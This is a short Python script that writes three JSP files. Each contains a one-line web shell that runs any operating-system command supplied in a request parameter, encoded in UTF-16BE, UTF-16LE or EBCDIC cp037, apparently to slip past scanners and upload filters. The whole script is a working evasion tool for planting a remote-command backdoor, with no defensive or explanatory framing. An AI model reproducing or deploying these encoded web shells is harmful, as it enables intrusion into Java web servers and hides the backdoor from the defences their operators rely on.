#!/usr/bin/env python3
# -*- coding:utf-8 -*-
charset = "utf-8"
data = '''<%Runtime.getRuntime().exec(request.getParameter("i"));%>'''.format(charset=charset)

f16be = open('utf-16be.jsp','wb')
f16be.write(b'<%@ page contentType="charset=utf-16be" %>')
f16be.write(data.encode('utf-16be'))
f16be.close()

f16le = open('utf-16le.jsp','wb')
f16le.write(b'<jsp:directive.page contentType="charset=utf-16le"/>')
f16le.write(data.encode('utf-16le'))
f16le.close()

fcp037 = open('cp037.jsp','wb')
fcp037.write(b'<%@ page contentType="charset=cp037"/>')
fcp037.write(data.encode('cp037'))
fcp037.close()
